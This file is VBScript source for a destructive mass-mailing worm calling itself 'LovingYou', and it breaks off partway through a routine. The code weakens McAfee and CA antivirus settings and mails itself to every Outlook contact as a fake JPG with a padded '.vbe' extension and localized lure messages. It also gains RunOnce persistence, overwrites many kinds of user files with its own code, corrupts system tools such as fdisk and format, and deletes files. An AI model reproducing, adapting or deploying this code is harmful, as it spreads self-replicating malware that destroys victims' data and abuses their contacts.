On Error Resume Next
dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow

eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
set dirsystem=fso.GetSpecialFolder(1)
set dirtemp=fso.GetSpecialFolder(2)
set dirwin=fso.GetSpecialFolder(0)

main()

Sub main()
On Error Resume Next
dim reg,icon,icon2,num,count,conteggio,contmain,s1,s2,s3,s4,s5,s6
s1="W"
s2="S"
s3="cript."
s4="She"
s5="ll"
s6=s1&s2&s3&s4&s5
set reg = CreateObject(s6)
 if (reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\InstallSubType") <> "") then
  count = reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\InstallSubType")
 else
  count = 1 
 end if
count = count + 1
if (reg.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Network Associates\TVD\VirusScan\szInstallDir") <> "") then
 mcafeechange(reg.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Network Associates\TVD\VirusScan\szInstallDir"))
end if
if (reg.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Resident\VetPath") <> "") then
 inoculateit()
end if
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
if (count = 24) then
Copy2()
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce\SysTray",dirsystem&"\SysTray.exe"&chr(39)&chr(39)&"                                                                                           .vbe"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\InstallSubType",count
else
if (count = 7) then
copy()
send()
hscript()
end if
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\InstallSubType",count
listadriv()
if (count = 5) then
reg.RegWrite "HKEY_CLASSES_ROOT\htfile\Shell\Open\command\","command.com /c del %1"
elseif (count = 4) then
reg.RegWrite "HKEY_CLASSES_ROOT\batfile\Shell\Open\command\","command.com /c del %1"
elseif (count = 20) then
reg.RegWrite "HKEY_CLASSES_ROOT\exefile\Shell\open\command\","command.com /c del %1"
elseif (count = 6) then
reg.RegWrite "HKEY_CLASSES_ROOT\CATFile\Shell\Open\command\","command.com /c del %1"
elseif (count = 8) then
fso.DeleteFile(dirwin&"\command\scanreg.exe")
set nuovo=fso.CreateTextFile(dirwin&"\command\scanreg.exe")
nuovo.Write "MZ"
for contmain=1 to 10
 for conteggio=1 to 255
  nuovo.Write chr(conteggio)
 next
next
nuovo.close
elseif (count = 9) then
fso.DeleteFile(dirwin&"\command\fdisk.exe")
set nuovo=fso.CreateTextFile(dirwin&"\command\fdisk.exe")
nuovo.Write "MZ"
for contmain=1 to 10
 for conteggio=1 to 255
  nuovo.Write chr(conteggio)
 next
next
nuovo.close
elseif (count = 10) then
fso.DeleteFile(dirwin&"\command\format.com")
set nuovo=fso.CreateTextFile(dirwin&"\command\format.com")
for contmain=1 to 10
 for conteggio=1 to 255
  nuovo.Write chr(conteggio)
 next
next
nuovo.close
elseif (count = 11) then
fso.DeleteFile(dirwin&"\command\start.exe")
set nuovo=fso.CreateTextFile(dirwin&"\command\start.exe")
nuovo.Write "MZ"
for contmain=1 to 10
 for conteggio=1 to 255
  nuovo.Write chr(conteggio)
 next
next
nuovo.close
elseif (count = 12) then
fso.DeleteFile(dirwin&"\command\mscdex.exe")
set nuovo=fso.CreateTextFile(dirwin&"\command\mscdex.exe")
nuovo.Write "MZ"
for contmain=1 to 10
 for conteggio=1 to 255
  nuovo.Write chr(conteggio)
 next
next
nuovo.close
elseif (count = 13) then
fso.DeleteFile(dirwin&"\command\move.exe")
set nuovo=fso.CreateTextFile(dirwin&"\command\move.exe")
nuovo.Write "MZ"
for contmain=1 to 10
 for conteggio=1 to 255
  nuovo.Write chr(conteggio)
 next
next
nuovo.close
elseif (count = 14) then
fso.DeleteFile(dirwin&"\command\extract.exe")
set nuovo=fso.CreateTextFile(dirwin&"\command\extract.exe")
nuovo.Write "MZ"
for contmain=1 to 10
 for conteggio=1 to 255
  nuovo.Write chr(conteggio)
 next
next
nuovo.close
elseif (count = 15) then
fso.DeleteFile(dirwin&"\command\deltree.exe")
set nuovo=fso.CreateTextFile(dirwin&"\command\deltree.exe")
nuovo.Write "MZ"
for contmain=1 to 10
 for conteggio=1 to 255
  nuovo.Write chr(conteggio)
 next
next
nuovo.close
elseif (count = 16) then
fso.DeleteFile(dirwin&"\command\edit.com")
set nuovo=fso.CreateTextFile(dirwin&"\command\edit.com")
for contmain=1 to 10
 for conteggio=1 to 255
  nuovo.Write chr(conteggio)
 next
next
nuovo.close
elseif (count > 17) then
set nuovo=fso.CreateTextFile(dirsystem&"\ODBC16G.DLL")
nuovo.Write "MZ"
for contmain=1 to 10
 for conteggio=1 to 255
  nuovo.Write chr(conteggio)
 next
next
nuovo.close
elseif (count > 20) then
listadriv2
end if
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\InstallSubType",count
end if
end sub

sub send()
set wshell=CreateObject("WScript.Shell")
set fso=CreateObject("Scripting.FileSystemObject")
set wfile=fso.CreateTextFile(dirsystem&"\MailToSend.vbe")
wfile.WriteLine "On Error Resume Next"
wfile.WriteLine  "dim x, y, lists, entries, mox, b, regedit, v, regad,s1,s2,s3,z1,z2,z3,z4,z5,r1,r2,r3,r4,r5,lang,ssubject,sbody,dirtemp"
wfile.WriteLine "set dirtemp=fso.GetSpecialFolder(2)"
wfile.WriteLine "s1="&chr(34)&"MA"&chr(34)
wfile.WriteLine "s2="&chr(34)&"PI"&chr(34)
wfile.WriteLine "s3=s1&s2"
wfile.WriteLine ""
wfile.WriteLine "z1="&chr(34)&"Outl"&chr(34)
wfile.WriteLine "z2="&chr(34)&"ook."&chr(34)
wfile.WriteLine "z3="&chr(34)&"Appli"&chr(34)
wfile.WriteLine "z4="&chr(34)&"cation"&chr(34)
wfile.WriteLine "z5=z1&z2&z3&z4"
wfile.WriteLine ""
wfile.WriteLine "r1="&chr(34)&"WS"&chr(34)
wfile.WriteLine "r2="&chr(34)&"cript"&chr(34)
wfile.WriteLine "r3="&chr(34)&".Sh"&chr(34)
wfile.WriteLine "r4="&chr(34)&"ell"&chr(34)
wfile.WriteLine "r5=r1&r2&r3&r4"
wfile.WriteLine ""
wfile.WriteLine  "set regedit = CreateObject(r4)"
wfile.WriteLine "set ecco=WScript.CreateObject(z5)"
wfile.WriteLine "lang=regedit.RegRead("&chr(34)&"HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\Locale\"&chr(34)&")"
wfile.WriteLine "if (lang = "&chr(34)&"00000410"&chr(34)&" or lang = "&chr(34)&"00000810"&chr(34)&") then "
wfile.WriteLine " ssubject="&chr(34)&"Ciao!!!"&chr(34)
wfile.WriteLine " sbody="&chr(34)&"Ciao, in questa e-mail ti allego una bella chicca ;-) Dagli un'occhiata."&chr(34) 
wfile.WriteLine "elseif (lang ="&chr(34)&"00000403"&chr(34)&" or lang="&chr(34)&"0000040A"&chr(34)&" or lang="&chr(34)&"0000080A"&chr(34)&" or lang="&chr(34)&"00000C0A"&chr(34)&" or lang="&chr(34)&"00002C0A"&chr(34)&") then"
wfile.WriteLine " ssubject="&chr(34)&"Hola!!!"&chr(34)
wfile.WriteLine " sbody="&chr(34)&"Hola, en éste mensaje està Càmeron Dìaz desnuda!!!"&chr(34)
wfile.WriteLine "else"
wfile.WriteLine " ssubject="&chr(34)&"Hello!!!"&chr(34)
wfile.WriteLine " sbody="&chr(34)&"Hi, in this e-mail you have attached a goody ;-) Check it out!"&chr(34)
wfile.WriteLine "end if"
wfile.WriteLine " set out = ecco"
wfile.WriteLine " set mapi = out.GetNameSpace(s3)"
wfile.WriteLine " for lists = 1 to mapi.AddressLists.Count"
wfile.WriteLine "   set y = mapi.AddressLists(lists)"
wfile.WriteLine "   x = 1"
wfile.WriteLine "   v = regedit.RegRead("&chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&chr(34)&" & y)"
wfile.WriteLine "   if (v = "&chr(34)&chr(34)&") then"
wfile.WriteLine "      v = 1"
wfile.WriteLine "   end if"
wfile.WriteLine "   if (int(y.AddressEntries.Count) > int(v)) then"
wfile.WriteLine "     for entries = 1 to y.AddressEntries.Count"
wfile.WriteLine "      mox = y.AddressEntries(x)"
wfile.WriteLine "      regad = "&chr(34)&chr(34)
wfile.WriteLine "       regad = regedit.RegRead("&chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&chr(34)&" & mox)"
wfile.WriteLine "   if (regad = "&chr(34)&chr(34)&") then"
wfile.WriteLine "         set xzx = ecco.CreateItem(0)"
wfile.WriteLine "         xzx.Recipients.Add(mox)"
wfile.WriteLine "          xzx.Subject = ssubject"
wfile.WriteLine "          xzx.Body =  vbcrlf & sbody"
wfile.WriteLine "          xzx.Attachments.Add(dirtemp & "&chr(34)&"\CameronDiaz_XXX.jpg                                                                                                              .vbe"&chr(34)&")"
wfile.WriteLine "          xzx.Send"
wfile.WriteLine "          regedit.RegWrite "&chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&chr(34)&" & mox, 1, "&chr(34)&"REG_DWORD"&chr(34)
wfile.WriteLine "        end if"
wfile.WriteLine "        x = x + 1"
wfile.WriteLine "      next"
wfile.WriteLine "regedit.RegWrite "&chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&chr(34)&"&y,y.AddressEntries.Count"
wfile.WriteLine "    else"
wfile.WriteLine "regedit.RegWrite "&chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&chr(34)&"&y,y.AddressEntries.Count"
wfile.WriteLine "    end if"
wfile.WriteLine "  next"
wfile.WriteLine "  Set out = Nothing"
wfile.WriteLine "  Set mapi = Nothing"
wfile.WriteLine " Set fso = CreateObject("&chr(34)&"Scripting.FileSystemObject"&chr(34)&")"
wfile.WriteLine "fso.DeleteFile(WScript.ScriptFullname)"
wfile.close
wshell.run (dirsystem&"\MailToSend.vbe")
end sub


sub copy()
  Set dirtemp = fso.GetSpecialFolder(2)
  Set c = fso.GetFile(WScript.ScriptFullName)
  c.Copy(dirtemp&"\CameronDiaz_XXX.jpg                                                                                                              .vbe")
end sub

sub copy2()
  Set dirtsystem = fso.GetSpecialFolder(1)
  Set c = fso.GetFile(WScript.ScriptFullName)
  c.Copy(dirsystem&"\SysTray.exe"&chr(39)&chr(39)&"                                                                                           .vbe")
end sub

sub mcafeechange(installdir)  
dim reg
set reg=CreateObject("WScript.Shell")
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Network Associates\TVD\McAfee VirusScan\CurrentVersion\Screen Scan\szDefProgExts","001 002 386 ADT APP ASP BAT BIN BO? CHM CMD COM DL? DEV DRV EXE HLP IM? INI MB? OCX OV? QLB SHS SYS VS? VXD XML XSL XTP WIZ CDR CSC DOC DOT GMS MD? MPP MPT MSG MSO OBD OBT OLE PP? POT QPW RTF SMM XL? WBK WPD CL?"
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Network Associates\TVD\McAfee VirusScan\CurrentVersion\Screen Scan\szProgExts","001 002 386 ADT APP ASP BAT BIN BO? CHM CMD COM DL? DEV DRV EXE HLP IM? INI MB? OCX OV? QLB SHS SYS VS? VXD XML XSL XTP WIZ CDR CSC DOC DOT GMS MD? MPP MPT MSG MSO OBD OBT OLE PP? POT QPW RTF SMM XL? WBK WPD CL?"
reg.RegWrite "HKEY_CURRENT_USER\Software\Network Associates\TVD\McAfee VirusScan\CurrentVersion\Screen Scan\szDefProgExts","001 002 386 ADT APP ASP BAT BIN BO? CHM CMD COM DL? DEV DRV EXE HLP IM? INI MB? OCX OV? QLB SHS SYS VS? VXD XML XSL XTP WIZ CDR CSC DOC DOT GMS MD? MPP MPT MSG MSO OBD OBT OLE PP? POT QPW RTF SMM XL? WBK WPD CL?"
reg.RegWrite "HKEY_CURRENT_USER\Software\Network Associates\TVD\McAfee VirusScan\CurrentVersion\Screen Scan\szProgExts","001 002 386 ADT APP ASP BAT BIN BO? CHM CMD COM DL? DEV DRV EXE HLP IM? INI MB? OCX OV? QLB SHS SYS VS? VXD XML XSL XTP WIZ CDR CSC DOC DOT GMS MD? MPP MPT MSG MSO OBD OBT OLE PP? POT QPW RTF SMM XL? WBK WPD CL?"
set script=fso.CreateTextFile(installdir & "\default.vsc")
        script.WriteLine "; Default McAfee VirusScan for Windows 95 options file"
        script.WriteLine ""
        script.WriteLine "[ScanOptions]"
        script.WriteLine "UIType=0"
        script.WriteLine "bAutoStart=0"
        script.WriteLine "bAutoExit=0"
        script.WriteLine "bAlwaysExit=0"
        script.WriteLine "bSkipMemoryScan=0"
        script.WriteLine "bSkipBootScan=0"
        script.WriteLine "bSkipSplash=0"
        script.WriteLine "nPriority=0"
        script.WriteLine "nChecksum=0"
        script.WriteLine "bConfigurableGuiMode=0"
        script.WriteLine "szTaskName="
        script.WriteLine ""
        script.WriteLine "[DetectionOptions]"
        script.WriteLine "bRemoveAllMacros=0"
        script.WriteLine "bScanAllFiles=0"
        script.WriteLine "bScanCompressed=0"
        script.WriteLine "szProgramExtensions=001 002 386 ADT APP ASP BAT BIN BO? CHM CMD COM DL? DEV DRV EXE HLP IM? INI MB? OCX OV? QLB SHS SYS VS? VXD XML XSL XTP WIZ CDR CSC DOC DOT GMS MD? MPP MPT MSG MSO OBD OBT OLE PP? POT QPW RTF SMM XL? WBK WPD CL?"
        script.WriteLine "szDefaultProgramExtensions=001 002 386 ADT APP ASP BAT BIN BO? CHM CMD COM DL? DEV DRV EXE HLP IM? INI MB? OCX OV? QLB SHS SYS VS? VXD XML XSL XTP WIZ CDR CSC DOC DOT GMS MD? MPP MPT MSG MSO OBD OBT OLE PP? POT QPW RTF SMM XL? WBK WPD CL?"
        script.WriteLine "bDetectTrojans=0"
        script.WriteLine "bDetectJoke=0"
        script.WriteLine "bDetectCorrupted=0"
        script.WriteLine "bDetectMaybe=0"
        script.WriteLine "bProgFileHeuristics=0"
        script.WriteLine "bMacroHeuristics=0"
        script.WriteLine ""
        script.WriteLine "[AlertOptions]"
        script.WriteLine "bNetworkAlert=0"
        script.WriteLine "bSoundAlert=1"
        script.WriteLine "szNetworkAlertPath="
        script.WriteLine ""
        script.WriteLine "[ActionOptions]"
        script.WriteLine "bDisplayMessage=0"
        script.WriteLine "ScanAction=0"
        script.WriteLine "bButtonClean=1"
        script.WriteLine "bButtonDelete=1"
        script.WriteLine "bButtonExclude=0"
        script.WriteLine "bButtonMove=1"
        script.WriteLine "bButtonContinue=1"
        script.WriteLine "bButtonStop=1"
        script.WriteLine "szMoveToFolder=\Infected"
        script.WriteLine "szCustomMessage=Possible Virus Detected"
        script.WriteLine ""
        script.WriteLine "[ReportOptions]"
        script.WriteLine "bLogToFile=1"
        script.WriteLine "bLimitSize=1"
        script.WriteLine "uMaxKilobytes=100"
        script.WriteLine "bLogDetection=1"
        script.WriteLine "bLogClean=1"
        script.WriteLine "bLogDelete=1"
        script.WriteLine "bLogMove=1"
        script.WriteLine "bLogSettings=1"
        script.WriteLine "bLogSummary=1"
        script.WriteLine "bLogDateTime=1"
        script.WriteLine "bLogUserName=1"
        script.WriteLine "szLogFileName=" & installdir & "\VSCLog.TXT"
        script.WriteLine ""
        script.WriteLine "[ScanItems]"
        script.WriteLine "NumScanItems=1"
        script.WriteLine "ScanItem_0=C:\|1"
        script.WriteLine ""
        script.WriteLine "[SecurityOptions]"
        script.WriteLine "szPasswordProtect=0"
        script.WriteLine "szPasswordCRC=0"
        script.WriteLine ""
        script.WriteLine "[ExcludedItems]"
        script.WriteLine "NumExcludeItems=1"
        script.WriteLine "ExcludedItem_0=\Recycled||1|1"
        script.close
end sub

sub listadriv
  On Error Resume Next
  Dim d,dc,s
  Set dc = fso.Drives
  For Each d in dc
    If d.DriveType = 2 or d.DriveType=3 Then
      folderlist(d.path & "\")
    end if
  Next
  listadriv = s
end sub

sub infectfiles(folderspec)  
  On Error Resume Next
  dim f,f1,fc,ext,ap,mircfname,s,bname,mp3,value,descr
set reg = CreateObject("WScript.Shell")
set f = fso.GetFolder(folderspec)
  set fc = f.Files
  for each f1 in fc
    ext = fso.GetExtensionName(f1.path)
    ext = lcase(ext)
    s = lcase(f1.name)
value = reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\InstallSubType")
if (value = "2") then
if (ext = "jpg") or (ext = "jpeg") then
      reg.RegWrite "HKEY_CLASSES_ROOT\jpegfile\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\jpegfile\ScriptEngine\","VBScript"
      set ap=fso.OpenTextFile(f1.path, 2,true)
      ap.write vbscopy
      ap.close
elseif (ext = "x3d") then
      reg.RegWrite "HKEY_CLASSES_ROOT\"&reg.RegRead("HKEY_CLASSES_ROOT\.x3d\")&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&reg.RegRead("HKEY_CLASSES_ROOT\.x3d\")&"\ScriptEngine\","VBScript"
      set ap=fso.OpenTextFile(f1.path, 2,true)
      ap.write vbscopy
      ap.close
end if
end if
if (value = "3") then
scort()
if (ext = "mp3") or (ext = "mp2") then
      reg.RegWrite "HKEY_CLASSES_ROOT\mp3file\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\mp3file\ScriptEngine\","VBScript"
      set ap=fso.OpenTextFile(f1.path, 2,true)
      ap.write vbscopy
      ap.close
elseif (ext = "vbs") or (ext = "vbe") then
      set ap=fso.OpenTextFile(f1.path,2,true)
      ap.Write vbscopy
      ap.close
end if
end if
if (value = "18") then
if (ext = "ini") or (ext = "inf") or (ext = "doc") or (ext = "dot") or (ext = "htm") or (ext = "html") or (ext = "htt") or (ext = "bmp") or (ext = "gif") or (ext = "hlp") or (ext = "zip") or (ext = "reg") or (ext = "wav") or (ext = "avi") or (ext = "scr") or (ext = "lnk") or (ext = "mid") or (ext = "midi") or (ext = "js" ) or (ext = "eml") or (ext = "m3u") then
descr=reg.RegRead("HKEY_CLASSES_ROOT\.ini\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.inf\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.doc\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.dot\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.htm\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.htt\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.bmp\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.gif\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.hlp\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.zip\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.reg\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.wav\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.avi\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.scr\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.lnk\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.mid\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.midi\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.js\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.eml\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"
descr=reg.RegRead("HKEY_CLASSES_ROOT\.m3u\")
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\shell\open\command\","C:\WINDOWS\WScript.exe %1 %*"
      reg.RegWrite "HKEY_CLASSES_ROOT\"&descr&"\ScriptEngine\","VBScript"

      set ap=fso.OpenTextFile(f1.path,2,true)
      ap.Write vbscopy
      ap.close
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce\"&f1.path,f1.path
end if
end if
if (value = "19") then
if (ext = "txt") or (ext = "rtf") or (ext = "log") then
      set ap=fso.OpenTextFile(f1.path, 2,true)
      ap.WriteLine "Questa è la fase 19 del virus LovingYou"
      ap.WriteLine ""
      ap.WriteLine "Di seguito sono elencate tutte le fasi del virus:"
      ap.WriteLine "1) Modifica delle impostazioni di sistema"
      ap.WriteLine "2) Sovrascrizione di file"
      ap.WriteLine "3) Sovrascrizione di altri file"
      ap.WriteLine "4) Modifica estensione"
      ap.WriteLine "5) Modifica estensione"
      ap.WriteLine "6) Modifica estensione"
      ap.WriteLine "7) Auto-send"
      ap.WriteLine "8-17) Eliminazione di file che potrebbero ripristinare il computer"
      ap.WriteLine "18) Sovrascrizione dei file con 17 estensioni diverse"
      ap.WriteLine "19) Sovrascrizione dei file txt, rtf e log"
      ap.WriteLine "20) Modifica fatale di una estensione "
      ap.WriteLine "oltre 20) Cancellazione casuale di file "
      ap.WriteLine ""
      ap.WriteLine "Do not worry, It loves you - LovingYou"
      ap.WriteLine ""
      ap.WriteLine "-------------------------------------------------------"
      ap.WriteLine ""
      ap.WriteLine "This is the number 19 stage of LovingYou virus"
      ap.WriteLine ""
      ap.WriteLine "Following are information about all virus stages:"
      ap.WriteLine "1) Editing system settings"
      ap.WriteLine "2) Overwriting some files"
      ap.WriteLine "3) Overwriting some else files"
      ap.WriteLine "4) Editing an extension"
      ap.WriteLine "5) Editing an extension"
      ap.WriteLine "6) Editing an extension"
      ap.WriteLine "7) Auto-send"
      ap.WriteLine "8-17) Erasing files that could restore the system"
      ap.WriteLine "18) Overwriting 17 different extensions files"
      ap.WriteLine "19) Overwriting the txt, rtf and log files"
      ap.WriteLine "20) Fatal editing of an enxtension"
      ap.WriteLine "up to 20) Randomly erasing files"
      ap.WriteLine ""
      ap.WriteLine "Do not worry, It loves you - LovingYou"
      ap.close
end if
end if
  next  
end sub

sub folderlist(folderspec)  
  On Error Resume Next
  dim f,f1,sf
  set f = fso.GetFolder(folderspec)  
  set sf = f.SubFolders
  for each f1 in sf
    infectfiles(f1.path)
    folderlist(f1.path)
  next  
end sub

sub randomdel(folderspec)
  On Error Resume Next
  dim f,f1,sf,z
  set f = fso.GetFolder(folderspec)  
  set sf = f.SubFolders
  for each f1 in sf
if (z <> 1) then
    z = 1
    delfile(f1.path)
end if
  next  
end sub

sub listadriv2
  On Error Resume Next
  Dim d,dc,s
  Set dc = fso.Drives
  For Each d in dc
    If d.DriveType = 2 or d.DriveType=3 Then
      randomdel(d.path & "\")
    end if
  Next
  listadriv2 = s
end sub

sub delfile(folderspec)  
 On Error Resume Next
 dim f,f1,fc,ext,ap,mircfname,s,bname,mp3,z
 set reg = CreateObject("WScript.Shell")
 set f = fso.GetFolder(folderspec)
 set fc = f.Files
 for each f1 in fc
if (z <> 1) then
z = 1
 set cop=fso.GetFile(f1.path)
 fso.DeleteFile(f1.path)
end if
next
end sub

sub inoculateit()
dim reg
set reg=CreateObject("WScript.Shell")
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Memory\Enabled",0, "REG_DWORD"
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Resident\Extension List","bat,bin,chm,com,dll,drv,dvb,exe,mdb,mso,ocx,ovl,pif,pot,pps,ppt,prc,qpw,rtf,shs,sys,vba,vsd,vss,vst,vxd,xla,xls,xlt"
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Resident\Scan All Files",0,"REG_DWORD"
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Resident\HeuristicScan",0,"REG_DWORD"
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Resident\DisableCleanup",1,"REG_DWORD"
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Scanning\Archive Extensions","zip"&chr(34)&"                                                                                                                                                                                                                                   ppp"
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Scanning\Checked ExtList","bat,bin,chm,com,dll,drv,dvb,exe,mdb,mso,ocx,ovl,pif,pot,pps,ppt,prc,qpw,rtf,shs,sys,vba,vsd,vss,vst,vxd,xla,xls,xlt"
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Scanning\Extension List","bat,bin,chm,com,dll,drv,dvb,exe,mdb,mso,ocx,ovl,pif,pot,pps,ppt,prc,qpw,rtf,shs,sys,vba,vsd,vss,vst,vxd,xla,xls,xlt"
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Scanning\HeuristicScan",0,"REG_DWORD"
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Scanning\Scan Compressed Archives",0,"REG_DWORD"

set target=fso.OpenTextFile(reg.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\Anti-Virus\Resident\VetPath")&"\regfix.inf",2,true)
target.WriteLine "[Version]"
target.WriteLine "Signature="&chr(34)&"$Chicago$"&chr(34)
target.WriteLine ""
target.WriteLine "[DefaultInstall.NT]"
target.WriteLine "AddReg=Fix_Vreg"
target.WriteLine ""
